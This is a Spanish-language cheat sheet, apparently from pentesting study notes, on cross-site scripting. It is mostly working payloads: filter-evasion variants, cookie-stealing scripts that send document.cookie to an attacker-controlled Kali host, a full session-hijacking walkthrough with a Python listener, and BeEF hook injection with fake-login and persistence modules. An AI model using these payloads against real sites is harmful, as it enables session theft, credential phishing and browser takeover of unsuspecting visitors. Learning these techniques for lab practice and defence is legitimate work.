# XSS — Cross-Site Scripting

Inyección de JavaScript en el navegador de la víctima mediante entrada no sanitizada.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `XSS-Guia.txt` | Tipos, payloads, evasión de filtros, robo de cookies, conexión con BeEF |
| `ApuntesBeEF.txt` | Post-explotación avanzada con Browser Exploitation Framework |

---

## Tipos

| Tipo | Persiste | Requiere clic | Vector |
|---|---|---|---|
| **Reflejado** | No | Sí | URL trampa |
| **Almacenado** | Sí | No | Campo de formulario |
| **DOM-based** | No | Sí (URL `#`) | JS del cliente |

---

## Payloads básicos

```html
<!-- Test -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Robo de cookie -->
<script>new Image().src='http://KALI:8888/?c='+document.cookie</script>
<script>fetch('http://KALI:8888/?c='+document.cookie)</script>

<!-- Hook BeEF -->
<script src="http://KALI:3000/hook.js"></script>
```

---

## Evasión de filtros

```html
<!-- Si <script> está filtrado -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input autofocus onfocus="alert(1)">
<a href="javascript:alert(1)">click</a>
<details open ontoggle="alert(1)">

<!-- Case mixing -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR="alert(1)">

<!-- Sin paréntesis -->
<img src=x onerror="alert`1`">

<!-- Anidado (si el filtro borra <script> una sola vez) -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Codificación HTML en href -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">X</a>
```

---

## Contextos de inyección

| Contexto | Input | Payload |
|---|---|---|
| HTML puro | `<div>AQUI</div>` | `<script>alert(1)</script>` |
| Atributo | `<input value="AQUI">` | `"><script>alert(1)</script>` |
| JS variable | `var x = "AQUI";` | `";alert(1)//` |
| href | `<a href="AQUI">` | `javascript:alert(1)` |

---

## Robo de cookies — flujo completo

```bash
# 1. Receptor en Kali
python3 -m http.server 8888

# 2. Payload inyectado
<script>new Image().src='http://[KALI_IP]:8888/?c='+document.cookie</script>

# 3. Llega la petición
GET /?c=PHPSESSID=abc123def456

# 4. Usar la cookie
# DevTools > Application > Cookies > cambiar valor > recargar
```

>  `HttpOnly` = JS **no puede** leer `document.cookie`. Sin este flag → accesible.

---

## BeEF — resumen

```bash
# Arrancar BeEF
sudo beef-xss
# Panel: http://127.0.0.1:3000/ui/panel

# Payload de hook
<script src="http://[KALI_IP]:3000/hook.js"></script>
```

**Módulos útiles:** `Get Cookie`, `Get Page HTML`, `Port Scanner`,  
`Pretty Theft` (overlay login falso), `Redirect Browser`, `Alert Dialog`

**Persistencia:** una vez hookeado se puede activar iframe invisible o pop-under  
→ el hook sobrevive aunque se cierre la página original.

> XSS Almacenado + BeEF = hook automático para todos los visitantes.
